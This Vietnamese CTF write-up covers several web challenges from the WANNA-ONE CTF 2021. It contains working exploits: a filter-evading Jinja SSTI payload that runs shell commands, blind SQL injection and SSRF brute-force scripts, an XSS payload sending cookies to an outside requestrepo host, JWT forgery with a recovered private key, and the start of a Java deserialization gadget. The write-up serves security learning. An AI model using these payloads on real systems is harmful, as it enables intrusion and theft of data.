---
layout: post
title: "WRITEUP WANNA-ONE CTF 2021: WEB"
categories: CTF
toc: true
render_with_liquid: false
---

Xin chào mọi người. Có lẽ đây là ctf trong nước cuối cùng mà mình chơi trong năm 2021 này, vì vậy mình muốn lưu lại một cái gì đó kỉ niệm cũng như những solution cho những challenge web khá hay mà cuộc thi đã phát hành.

Tất cả source code của bài mình để ở đây nhé  [SOURCE](https://github.com/DauHoangTai/WriteupCTF/tree/master/wargame/UIT_CTF)

## Challenge d3cod3r
Bài này thì tác giả không cung cấp source nên việc mình làm đầu tiên và đi tìm hiểu chương trình hoạt động như nào, có những tính năng gì. Sau khi mình fuzz thì thấy được web có 2 `route` chính:
+ `/encode` -> nhận input của mình và render ra chuỗi base64 encode
+ `/decode` -> đưa vô chuỗi base64 encode, sau đó chương trình sẽ decode và render ra plaintext.

### IDEA
- Khi mình thấy input được đưa vào sẽ base64 encode nhưng đưa chuỗi base64 encode đó qua route `/decode` để decode thì sẽ trả về lại chuỗi ban đầu của chúng ta nhập vào thì mình đã nghĩ có thể bài này liên quan đến `xss` hoặc `ssti`. Nhưng mình không thấy có route vào để send cho bot hay link bot => có vẻ không phải xss.
- Khi mình check `header` mà reponse trả về là `Server: Werkzeug/2.0.2 Python/3.8.12` => có thể `ssti`.
- Tới đây mình thử payload đơn giản của ssti `{{1-1}}` (base64 encode trước), nếu như kết quả sau khi decode bằng `0` => sure ssti. 
- Nhưng kết quả trả về `WAF: <-- / -->` => có thể một số kí tự đã bị lọc, mình có thử thêm `+ - *` thì cũng bị lọc hết. Mình có thử tiếp payload `{{config}}` nhưng kết quả `config` vẫn bị lọc. Tới đây dù kết quả mình mong muốn là `0` như ban đầu để confirm bài này dính `ssti` nhưng từ các char bị filter ở trên thì mình đã phần nào đoán ra và sure bài này là `ssti`.
- Nhiệm vụ của mình bây giờ cần đi tìm những kí nào khác bị filter để từ đó có thể gen ra 1 payload có thể rce.
- Sau một thời gian thì mình đã tìm ra một số char và chuỗi bị filter: `[ ] config session request cycler self lipsum` thêm một số char đi kèm với nhau mới bị lọc như `""`, `''`,{% raw %}`{{()`{% endraw %}.
- Nhưng có một số kí tự sau có thể gen thành payload mà mình hay sài thì không bị filter `\ ' " ()` => mình sử dụng những char này (cách này là sử dụng unicode).

### Payload

{% highlight text %}
{% raw %}
{{"\u0022\u0022"|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(0)|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(132)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("popen")("ls")|attr("read")()}}
{%  endraw %}
{% endhighlight %}

- Payload này là {% raw %}`{{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls').read()}}`{% endraw %}. 

Result:

![image](https://user-images.githubusercontent.com/54855855/146686425-4ea2e897-baf7-4f0b-8332-f76d09d67008.png)

Vậy `flag` ở thư mục hiện tại => bây giờ chỉ cần thay `ls` = `cat flag`, nhưng kết quả trả về cho ta biết chương trình filter `g` và space
- Mình quyết định unicode luôn chuỗi `cat flag` và đây là payload cuối cùng để get flag.

{% highlight text %}
{% raw %}
{{"\u0022\u0022"|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(0)|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(132)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("popen")("\u0063\u0061\u0074\u0020\u0066\u006c\u0061\u0067")|attr("read")()}}
{%  endraw %}
{% endhighlight %}

- Payload này là {% raw %}`{{"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat flag').read()}}`{% endraw %}

- Script:
{% highlight python %}
{% raw %}
import requests
import re

url = 'http://45.122.249.68:10011/'
res_regex = r'<p class="lead">(.*?)</p>'


def b64_encode():
    data = {'text':'{{"\\u0022\\u0022"|attr("\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f")|attr("\\u005f\\u005f\\u0062\\u0061\\u0073\\u0065\\u0073\\u005f\\u005f")|attr("\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f")(0)|attr("\\u005f\\u005f\\u0073\\u0075\\u0062\\u0063\\u006c\\u0061\\u0073\\u0073\\u0065\\u0073\\u005f\\u005f")()|attr("\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f")(132)|attr("\\u005f\\u005f\\u0069\\u006e\\u0069\\u0074\\u005f\\u005f")|attr("\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f")|attr("\\u005f\\u005f\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006d\\u005f\\u005f")("popen")("\\u0063\\u0061\\u0074\\u0020\\u0066\\u006c\\u0061\\u0067")|attr("read")()}}'}
    try:
        r = requests.post(url+'encode', data=data)
    except Exception as e:
        raise e
    str_encode = re.findall(res_regex,r.text)
    return str_encode[1]

def b64_decode():
    text = b64_encode()
    data = {'text':text}
    try:
        r = requests.post(url+'decode', data=data)
    except Exception as e:
        raise e
    print(r.text)

b64_decode()

{%  endraw %}
{% endhighlight %}

- How to run:

![image](https://user-images.githubusercontent.com/54855855/146687102-5537327a-7e43-4d3c-a87e-c5a2afeb5439.png)

## Challenge SQL maxter
Bài này khi mới vô tưởng chừng như lại phải fuzz tiếp nhưng khi mình view-source thì thấy được tác giả cung cấp source ở `/getmission.phps`.

Source:
```php
<?php
include 'config.php';
include 'waf.php';

$heroname = $_POST['heroname'] ?? NULL;
$mission = $_POST['mission'] ?? NULL;

if(preg_match($waf, $heroname))
{
    die("Wrong way h4ck3r");
}

$hero  = "SELECT * FROM heroes WHERE name = '{$heroname}'";
$result = $mysqli->query($hero);

$enemy = "SELECT power FROM heroes WHERE name='boros'";
$enemy__power = $mysqli->query($enemy);

if ($result-> num_rows === 1) {
    $hero__info = $result->fetch_array();
    $enemy__power = $enemy__power->fetch_array();
    if ($hero__info['mission'] == $mission || $hero__info['power'] > $enemy__power['power']) {
        die($flag);
    } else {
        die("Mission failed");
    }
} else {
    die("Mission failed!!!");
}
?>
```
Phân tích source:
+ Có 2 tham số để nhập vào `heroname`, `mission` theo POST method.
+ Check `heroname` mình nhập vào có char hay string nào nằm trong `waf` hay không. Biến `$waf` mình không thấy được khai báo trong code này nhưng theo mình đoán thì nó được khởi tạo trong file `waf.php` đã được include ở đầu file.
+ Tiếp theo có 2 câu query:
    + `SELECT * FROM heroes WHERE name = '{$heroname}'` -> Input của mình được đưa thẳng vô câu query và chương trình không sử dụng `prepared statement` mà sử dụng hàm `query` nên ở đây có thể bị sqli.
    + `SELECT power FROM heroes WHERE name='boros'` -> câu query này không có input nào của mình được đưa vào và nhiệm vụ của query này chỉ là lấy ra giá trị của cột `power` tại cột `name=boros`. Không có sqli ở query này.
+ Check `num_rows` của query đầu tiên trả về phải `=== 1`, hoặc câu query lỗi thì sẽ trả về `Mission failed!!!` và in ra màn hình.
+ Check giá trị ở cột `mission` có điều kiện là cột `name` mà mình nhập vào, nếu như bằng với tham số `mission` mình nhập thì sẽ in ra `flag`. Hoặc giá trị ở cột `power` có điều kiện là cột `name` mà mình nhập vào phải lớn hơn `power` của `name=boros` thì cũng sẽ in ra flag. Nhưng ở đây mình có thể control được `heroname` và `mission` nên vế trái sẽ dễ hơn, còn vế phải thì mình nghĩ sure tác giả không bao giờ để giá trị lớn hơn như thế để mình get flag dễ dàng.

### IDEA
Đầu tiên khi mình nhìn vào so sánh `==` ở vế trái của câu lệnh `if` thì mình nghĩ đã liên quan đến cái này, vì đây là một so sánh lỏng lẻo, có một số vấn đề bảo mật về việc so sánh như này. Suy nghĩ của mình lúc đó sẽ là tìm `query` trả về `null` và nhập `mission` là một array thì sẽ trả về true và có được flag.
+ Bây giờ mình cần làm là sqli thành công rồi mới tính tới việc tìm query trả về `null`
+ Mình thử với payload ở tham số `heroname` là `saitama' and 1=1-- -` thì server trả về `Wrong way h4ck3r` => một trong mấy kí tự này  đã bị filter. Sau một hồi mình test thì thấy được ở payload trên bị filter `and`.
+ Tiếp theo mình thử payload khác không có `and` -> `saitama' && 1=1-- -`, server trả về `Mission failed` như ban đầu chúng ta nhập vào `saitama`.
+ Thử tiếp payload khác `saitama' && 1=2-- -`, server trả về `Mission failed` => confirm được có thể sqli và tới đây thì mình sẽ blind giá trị ở cột `mission` thôi. 
+ Mình test `like binary %` đều không bị filter nên mình sử dụng những function và char này để tạo query blind

### Payload
```py
import requests
import string

url = 'http://45.122.249.68:10002/getmission.php'
VAL_MISS = ''

def brute_miss():   
    global VAL_MISS
    for i in range(1,500):
        for char in string.digits + string.ascii_letters + '%':
            # print(char,end='\r')
            data = {'heroname':f"saitama'&&mission like binary '{VAL_MISS+char}%'-- -",'mission':'a'}
            r = requests.post(url,data=data)
            # print(r.text)
            if "Mission failed!!!" not in r.text:
                VAL_MISS += char
                break
        if '%' in VAL_MISS:
            break
    return VAL_MISS[:-1]

def getFlag():
    mission = brute_miss()
    data = {'heroname':f"saitama",'mission':mission}
    r = requests.post(url, data=data)
    print(f"mission: {mission}")
    print(f"Flag: {r.text}")

getFlag()
```
Result:

![image](https://user-images.githubusercontent.com/54855855/146731340-7bee0120-a4c5-48c2-b831-402b4a9c03f2.png)

## Challenge list file as a service
Tiếp tục là 1 bài php và được cung cấp source code, mình sẽ phân tich source chương trình hoạt động như nào dựa vào source mà tác giả đã cung cấp ở dưới đây:

File `ssrf.php`:
```php
<?php

function filter($args){
	$blacklists = ["127.0.0.1","0.0.0.0", "127.0.1","127.1","0","localhost","2130706433","0x7f000001","0177.0.0.1"];
	$whitelists = ["http" , "https"];
	if(!in_array($args["scheme"],$whitelists))
		{echo $args["scheme"];
		return 0;}
	else{
		if(in_array($args["host"],$blacklists) ){
			echo $args["host"];
			return 0;
		}
		if(strpos($args["query"],"dir_name")){
			return 0;
		}
	}
	return 1;
}
if(isset($_GET["host"])){
	if(filter_var($_GET["host"], FILTER_VALIDATE_URL)) {
		$r = parse_url($_GET["host"]);
	    if(filter($r)){
	    	$ch = curl_init();
	    	curl_setopt($ch, CURLOPT_URL,$_GET["host"] );

	    	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	    	
	    	$output = curl_exec($ch);
	    	curl_close($ch); 
	    	echo($output);
	    }
	    else
	    	die("dont hack me pls");
	}
}
```
- Có 1 tham số để chúng ta nhập vào là `host`, kiểm tra input đưa vào phải là URl hợp lệ.
- Sử dụng hàm `parse_url` để parse ra các thông tin của url mà chúng ta đưa vào.
- Đưa array thông tin đã parse đó vào hàm `filter` (hàm này do tác giả tự viết).
- Để hiểu rõ hơn `parse_url` nó sẽ hoạt động như nào thì mình sẽ show ra thông tin sau khi hàm đó thực hiện ở đây

![image](https://user-images.githubusercontent.com/54855855/146772969-cecb3cb4-3fa0-47ea-8142-0e0d3b690821.png)

- Function `filter`:

    ```php
    function filter($args){
        $blacklists = ["127.0.0.1","0.0.0.0", "127.0.1","127.1","0","localhost","2130706433","0x7f000001","0177.0.0.1"];
        $whitelists = ["http" , "https"];
        if(!in_array($args["scheme"],$whitelists))
            {echo $args["scheme"];
            return 0;}
        else{
            if(in_array($args["host"],$blacklists) ){
                echo $args["host"];
                return 0;
            }
            if(strpos($args["query"],"dir_name")){
                return 0;
            }
        }
        return 1;
    }
    ```

    + Đầu tiên sẽ check `scheme` phải `http` hoặc `https`.
    + Tiếp theo check `host` không thuộc trong array `blacklists`. Check đoạn này chủ yếu để mình khỏi truy cập từ `localhost` (dạng SSRF), ở đây hầu hết các cách ssrf thông thường đã bị check.
    + Cuối cùng check vị trí của tham số `dir_name` ở trong `query` nhưng tác giải lại không để = bao nhiêu => điều kiện này chỉ là lừa.
- File `dir.php`:

```php

<?php
echo 'User IP - '.$_SERVER['REMOTE_ADDR'];
if($_SERVER['REMOTE_ADDR']=== "127.0.0.1"){
	if(isset($_GET['dir_name'])){
		$dir = new DirectoryIterator($_GET['dir_name']);
		foreach ($dir as $key) {
			echo $key->getType();
		}
	}
	if(isset($_GET['file'])){
		var_dump(file_get_contents($_GET['file']));
	}
}
else{
	highlight_file(__FILE__);
}
```

- Ở file này đầu tiên sẽ check địa chỉ IP mà access đến phải là `127.0.0.1`.
- Tiếp theo ở đây có 2 tham số để chúng ta truyền vào theo GET method là `dir_name` và `file`.
- `dir_name` sẽ được đưa vào class `DirectoryIterator` (Class này đơn giản là sẽ hiện thì ra contents của cái filesystem directories mà chúng ta đưa vào). Sau đó sẽ in ra `type` của contents có trong folder đó.
- tham số `file` sẽ đưa vô hàm `file_get_contents` để đọc file đó ra.

### IDEA
Sau khi phân tích source xong thì có thể thấy rằng bài này là `ssrf` và mình cần làm là phải vượt qua được `blacklist` để access vô `/dir.php` để bằng `localhost`.
- Lúc đầu mình kiếm một số cheatseet về ssrf để kiếm payload bypass, nhưng hầu hết các payload đó đã bị chặn.
- Nhưng có một bài viết của [anh_da_cam](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) nói về sự khác nhau giữa `parse_url` và `curl`.

![image](https://user-images.githubusercontent.com/54855855/146792395-3bb0a62b-5266-488c-bf19-366b50d302eb.png)

- Payload sẽ có dạng như trên hình, khi parse thì PHP sẽ xử lí đoạn `google.com` còn lúc curl thì sẽ xử lí đoạn `evil.com:80`
- Vậy ở đây chúng ta chỉ cần thay đoạn `evil.com:80` thành `localhost:80` thì lúc đó khi parse thì sẽ parse đoạn `google.com` => bypass được hàm `filter`. Lúc curl thì sẽ tới `localhost` => có thể truy cập vô `/dir.php`.
- Khi vô được `/dir.php` rồi mình có thể đọc `flag` vì có hàm `file_get_contents` và tham số `file` có thể control, nhưng với điều kiện phải biết tên file flag và nằm ở đâu.
- Tác giả có gợi ý ở description là flag nằm ở `tmp`
- Tới đây thì mình bắt đầu sử dụng tham số `dir_name` vì nó được đưa vô class `DirectoryIterator` => có thể check được từng file nằm trong từng folder, nhưng ở đây chỉ in ra type của file => không biết được tên của các file và folder.
- Khi mình nhập payload `http://foo@localhost:80@google.com/dir.php?dir_name=/tmp/` có kết quả trả về như dưới

    ![image](https://user-images.githubusercontent.com/54855855/146806305-70c2f703-4145-407d-b02f-c0bbf6f03920.png)

- Sau một hồi stuck thì mình thấy khi mình nghĩ đến phải dùng `glob://` để brute filename hoặc folder nằm trong `/tmp`, nếu có thì sẽ trả về là `dir` hoặc `file`.

### Payload 
```py
import requests
import string

url = 'http://45.122.249.68:10004/ssrf.php'

def getDir():
    dir_tmp = ''
    for i in range(1,500):
        for char in string.printable.replace("*",'').replace("?", ''):
            # print(char,end='\r')
            params = {'host':f'http://foo@localhost:80@google.com/dir.php?dir_name=glob:///tmp/{dir_tmp+char}*'}
            r = requests.get(url, params=params)
            if "file" in r.text or 'dir' in r.text:
                dir_tmp += char
                break
        if "#" in dir_tmp:
            break
    return dir_tmp[:-1]

def getFile():
    dir_flag = getDir()
    flag_name = ''
    for i in range(1,500):
        for char in string.printable.replace("*",'').replace("?", ''):
            # print(char,end='\r')
            params = {'host':f'http://foo@localhost:80@google.com/dir.php?dir_name=glob:///tmp/{dir_flag}/{flag_name+char}*'}
            r = requests.get(url, params=params)
            if "file" in r.text or 'dir' in r.text:
                flag_name += char
                break
        if "#" in flag_name:
            break
    return flag_name[:-1]

def getFlag():
    full_dir = f'/tmp/{getDir()}/{getFile()}'
    print(f"Full_dir: {full_dir}")
    params = {'host':f'http://foo@localhost:80@google.com/dir.php?file={full_dir}'}
    r = requests.get(url, params=params)
    print(r.text)

getFlag()
```
Flag:

![image](https://user-images.githubusercontent.com/54855855/146809793-04f85675-0d45-4d70-88d0-0494aea7fa80.png)

## Challenge xss for newbie
Tên bài là cho newbie nhưng thực sự không dành cho newbie chút nào >< Mình đã stuck khá lâu ở bài này từ đoạn trigger cho đến bước có thể steal cookie.

Bài này không được cung cấp source và cũng không có chỗ input để xss như mấy bài xss mình thường làm, chỉ có 1 chỗ để report url cho bot. Nhưng khi `view-source` thì thấy được có 1 đoạn code js như sau:

```js
let html = window.location.search.substr(1).split("&")[0].split("=")[1] ? window.location.search.substr(1).split("&")[0].split("=")[1] : "<h1>hello</h1>";
  document.write(sanitizeHtml(decodeURIComponent(html)));
  console.log(sanitizeHtml(decodeURIComponent(html)));
```

- Đoạn code chỉ có chức năng nếu có tham số thứ nhất truyền vào thì sẽ in ra giá trị đó. Nhưng trước khi in ra thì có đưa vào hàm `sanitizeHtml` để chống xss.

### IDEA
- Ban đầu mình cứ chăm chăm vào hàm `sanitizeHtml` và phải đi tìm nó, tìm cách bypass để có thể trigger được xss
- Sau một hồi thì mình đọc lại `view-source` thì thấy được tác giả có include lib bên ngoài vào để sử dụng.

    ![image](https://user-images.githubusercontent.com/54855855/146814252-a4719471-26d8-4507-80e4-2ca0c0fe4a86.png)

- Tới đây thì mình tự dưng thấy cái lib include vào quen quen, mình từng gặp trong 1 bài ctf cách đây không lâu.
- Mình đã mò lại và thấy cái này khá giống với bài [jQuery query-object plugin](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/jquery-query-object.md)
- Mình cố gắng tìm thêm 1 hồi nữa thì ở trong này thì thấy được gadget để sử dụng trigger xss [sanitize-html](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/sanitize-html.md)
- Khi đã đầy đủ thông tin thì bây giờ mình test thôi với payload
    ```
    ?test=<a>&__proto__[innerText]=<script>alert(1)</script>
    ```
    ![image](https://user-images.githubusercontent.com/54855855/146814928-1844ef34-ba26-42a0-b7a2-42ec3d134d1f.png)

Như vậy đã trigger thành công xss, bây giờ chỉ việc steal cookie và có flag.
- Nhưng đời không như là mơ, tới đây dù mình đã fetch các thứ nhưng đều không có cookie trả về. Xoay một hồi loay hoay thì đã phải đi hỏi tác giả của bài và nhận được hint.
    ![image](https://user-images.githubusercontent.com/54855855/146815141-bb4dc477-937e-4ecd-8341-e20e5d0cd0c5.png)

- Vậy là localhost chạy port 8000 => có thể tác giả setcookie cho localhost:8000 này.

### Payload

```
http://localhost:8000?test=<a>&__proto__[innerText]=<script>fetch("http://0qu8ci0g.requestrepo.com?".concat(document.cookie))</script>
```
Sau khi send payload này thì nhận được cookie trả về chứa `flag`

![image](https://user-images.githubusercontent.com/54855855/146815586-50cd9dce-c8fe-434e-b3a8-60e304024235.png)

## Challenge Super safe token
Bài này được cung cấp source nên mình biết được web được code bằng python có sử dụng sql. Mới access vô url thì mình chưa thể hình dung ra bài này là dạng gì. Nhưng được cung cấp source thì mình sẽ lao đầu vô đọc source trước.

Mình sẽ phân tích những đoạn code chính và những đoạn code dẫn đến lỗi để mình có thể exploit thôi nhé

Phân tích source:
- Route `/get_token`:

    ```py
    private_key = open('priv.pem').read()
    public_key = open('pub.pem').read()

    @app.route("/get_token")
    def get_token():
    return jwt.encode({'username': 'admin', 'now': time.time()}, private_key, algorithm='RS256')
    ```
    + Đoạn code này thì đọc file `priv.pem` và `pub.pem` rồi gán cho 2 biến `private_key` và `public_key`
    + Khi acces vô `/get_token` thì chúng ta sẽ đực trả về một `JSON Web Token` (JWT). token này có `username=admin` kí bằng `private_key` ở trên và sử dụng thuật toán `RS256`

- Route `/admin`:
    ```py
    @app.route("/admin", methods=['POST'])
    def get_flag():
    try:
        payload = jwt.decode(request.form['jwt'], public_key, algorithms='RS256')
        if 'admin' in payload['username']:
        return query.query(payload['username'])
        else: return "You're not admin !!!"
    except:
        return "0ops, it's wrong way"
    #except Exception as e: print(e)
  ```
  
  + Truy cập vô route này cần POST method và có một tham số có thể control là `jwt`.
  + Sau khi nhập `jwt` vào thì sẽ được decode đoạn input chúng ta nhập vào đó bằng `public_key` và thuật toán `RS256`.
  + Check trong token có `admin` nằm trong `username` không, chỉ cần có trong chứ không cần phải bằng.
  + Sau đó sẽ đưa giá trị của `username` vô hàm `query` được tạo ở file `query.py`.
  + Nếu decode token lỗi thì trả về `0ops, it's wrong way`.
- File `query.py` mình chỉ chú ý vô đoạn code này thôi

    ```py
    def query(payload):
    config = {
            'user': 'root',
            'password': 'root',
            'host': 'mysql8',
            'port': '3306',
            'database': 'websec'
        }
    connection = mysql.connector.connect(**config)
    cursor = connection.cursor()
    if (waf(payload)):
        print('start query')
        cursor.execute("select * from users where uname = '{0}'".format(payload))
        result = cursor.fetchall()
    cursor.close()
    connection.close()
    return ''.join(str(s) for s in result)
    
    def waf(payload):
    blacklists = ['mysql', 'history','set','general_log',';', ' ', '#','-']
    for i in blacklists:
        if i in payload:
        return False
    return True
    ```
    + Giá trị `username` trong jwt token được đưa vô hàm `query`. Đoạn code dầu chỉ là setup connect db nên mình bỏ qua.
    + Check giá trị `username` chứa các kí tự hay string mà nằm trong blacklist thì sẽ không được chạy câu query `select * from users where uname = '{0}'".format(payload)`.
    + Nhưng khi mình vượt qua blacklist thì có thể chạy câu query trên và chú ý thì input nếu đưa vô như vậy thì có thể escape dấu `'` và  sqli
- Ở hàm main của file `app.py` có một dòng code `init.init_database()` và tới đây mình lại tiếp tục qua file `init.py` để xem hàm `init_database` làm nhiệm vụ gì
- File `init.py`:
    ```py
    def init_database():
    config = {
            'user': 'root',
            'password': 'root',
            'host': 'mysql8',
            'port': '3306',
            'database': 'websec'
        }
    connection = mysql.connector.connect(**config)
    cursor = connection.cursor()
    cursor.execute("""CREATE TABLE flags (flag VARCHAR(50));""")
    cursor.execute("""INSERT INTO flags VALUE('Wanna.One{just_a_fake_flag}');""")
    cursor.execute("""DROP TABLE flags;""")
    cursor.close()
    connection.close()
    ```
    + Ở file này mình chỉ chú ý đến 3 dòng code:
    ```py
    cursor.execute("""CREATE TABLE flags (flag VARCHAR(50));""")
    cursor.execute("""INSERT INTO flags VALUE('Wanna.One{just_a_fake_flag}');""")
    cursor.execute("""DROP TABLE flags;""")
    ```

    + Tạo table `flags` với column `flag`. Sau đó `insert` flag vô column đó, nhưng tiếp theo lại xóa đi table đó luôn.
    + Đọc 3 đoạn code này xong thì mình nảy ra ý tưởng trong đầu về bài này luôn và mình sẽ nói ở ngay bên dưới đây.

### IDEA
- Mình thấy flag sau khi được insert vô thì bị xóa ngay sau đó, vậy ý tưởng của mình bài này sẽ là:
    + Đầu tiên cần tìm được `private_key` để ký 1 cái jwt mới với giá trị `username` mình muốn.
    + Giá trị `username` đưa vào câu query mà mình có thể sqli => ở đây mình chỉ cần bypass các kí tự bị filter để hoàn thành việc này.
    + Sau khi sqli thành công thì mình sẽ chèn câu query đọc lại `history` của các query đã thực hiện.

### Payload
- Cách gen ra được `private_key`:
    + Đầu tiên mình sẽ get 2 token

    ```
    eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwibm93IjoxNjQwMDI3MDg2LjYzODM3MzR9.BRZLl0UVOPUpE92vbUX2gozSiT8zfQOMeNbU5IozhknBSAcepYErpOd8UAvJS5U2rNg_Kc2wh4nmUqn6vaHyAD_1OxXu7s_FEOMiYjNi1X7DqEp7G6mVkt3pbFN2BPqamvQW1MhWfl_maPHV

    eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwibm93IjoxNjQwMDI3MTA5LjYwNjkwNDN9.EJiHZT_u9yZtqYyQDOoW69SKsBwmrMxZtreoWqPSkZV3rMpmS1jZ0Hppat65KFAUJh67yTar4I63ys2eMthq5h0tMnQrdl9BiIiPxCEOIWCZAAGNMhSbnjhxUxOPZLsxPhgGcN6op42XKzLU
    ```

    + Sử dụng tool [rsa_sign2n](https://github.com/silentsignal/rsa_sign2n) để thực hiện việc gen ra `public_key` trước.

    ![image](https://user-images.githubusercontent.com/54855855/146819604-e827d9d4-3799-4fd5-8ec5-555d045c932b.png)

    + 2 file được tạo ra đó chính là `public_key`.
    + Tiếp theo sử dụng tool [RSA_tool](https://github.com/Ganapati/RsaCtfTool) để gen ra `private_key` như mình mong muốn. Nhưng để gen được đoạn này thì cần copy content của 1 trong 2 file đã được tạo ở bước trên vô folder của tool này.

    ![image](https://user-images.githubusercontent.com/54855855/146820124-7d1530b5-a096-4cf5-8fa1-d8d23cf77d17.png)

    + Sau đó chạy file `RsaCtfTool.py` như sau:

    ![image](https://user-images.githubusercontent.com/54855855/146820395-a4574f9f-7cba-4938-8f4e-185866851aa6.png)

    + Vậy là đã tìm được `private_key`

- Sau khi gen được `private_key` thì bây giờ là việc sử dụng nó để kí 1 jwt mới với `username` mình mong muốn nhưng phải chứa `admin` trong đó.
- Final payload:

```py
import jwt
import requests

url = 'http://45.122.249.68:10013/'

private_key = """-----BEGIN RSA PRIVATE KEY-----
MIIByQIBAAJsEOk75AnYhq1Z8+WrGlfJ3Mq2hFtYcImMo+xPyeDrIar9lEEYQ1xc
C4YgAWd4w8AIFm4Sj6cTD09IlAjB+Kp9Dnjh9Fzn2nyuCzQqBSREMseoYNGwt1KH
kvbP4A3qJE2A7gpmInHDWu4Vxd/DAgMBAAECbAwlhm8V4B1SlpBfYMHnv6MYzJNV
zc6ix6NClMcAiPtFW6GMA0jxohWnwx1LFtOKNDq57dzbK/0ojFNdW19VyE7CvMjw
8LZBy4mkAGNmPw/sqa6Te+WfyVLGxU/yJ5ea4CHnQ7RGUDSTEENJQQICA1UCawUT
RxhSL5OPj73xfq4rwO8hhuhl1+qNhSTkLsE9Mw800VsDB5T3Z43QBM2znJcvIL0z
8Smcrvx91Y6Q4kegtZaAHWXZQa6Dp8dWyHv9rdPRFDiq+U/tjTo2Q8n+xh6z697/
0dKD+wEt8Ya3AgFZAmsDcHjxZmCPYu5KDemHJmdspg/CVaHodVcRFQEKOurrFyP4
xSjSLoaid6GJtHodifZpwVVgmamLucqK/mwZljL4doF1j7EPDnEYiRr7y4GM1Vca
v+KL47OdC0ENFfY0wEDLshkCzCXBOt0+KQICAsA=
-----END RSA PRIVATE KEY-----
"""
def gen_jwt():
    token = jwt.encode({"username": "admin'union/**/select/**/1,2,query_sample_text/**/from/**/performance_schema.events_statements_summary_by_digest/**/where/**/query_sample_text/**/like/**/'%Wanna%", 'now': 1632536761.4651732}, private_key, algorithm='RS256')
    # print(str(token))
    return token.decode("utf-8")

def get_flag():
    new_jwt = gen_jwt()
    data = {"jwt":new_jwt}
    r = requests.post(url+'admin', data=data)
    text_res = r.text
    flag = text_res.split(',')
    for i in flag:
        if "Wanna.One{" in i:
            print(i)
            break

get_flag()
```

- Ở đây mình sử dụng `/**/` để bypass space, và để escape dấu `'` ở cuối thì mình sẽ kiểu `select * from users where uname = 'admin union 1,2,'3'` => dấu `'` ở bao quanh số 3 để biến 3 thành một str.

Flag:

![image](https://user-images.githubusercontent.com/54855855/146822708-677f4a94-bf42-4153-89f9-d4726f0e2b41.png)

- Query trên mình thao khảo ở đây [Statement Summary Tables](https://dev.mysql.com/doc/refman/8.0/en/performance-schema-statement-summary-tables.html) và [Performance Schema Statement Digests](https://dev.mysql.com/doc/refman/5.7/en/performance-schema-statement-digests.html)

## Challenge java for beginer

- Script tạo gadget chain:

```java
package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.ClassFiles;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.PriorityQueue;
import java.util.Queue;

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({ "org.apache.commons:commons-collections4:4.0" })
public class UIT_RCE extends PayloadRunner implements ObjectPayload<Queue<Object>> {
    @Override
    public Queue<Object> getObject(String header) throws Exception {
        String js_code = "isWin = java.lang.System.getProperty(\"os.name\").toLowerCase().contains(\"win\");" +
						"currentThread = org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes();" +
						"requestFacade = currentThread.getRequest();" +
						"requestField = org.apache.catalina.connector.RequestFacade.class.getDeclaredField(\"request\");" +
						"requestField.setAccessible(true);" +
						"request = requestField.get(requestFacade);" +
						"response = request.getResponse();" +
						"outputStream = response.getOutputStream();" +
						"command = request.getHeader(\"" + header + "\");" +
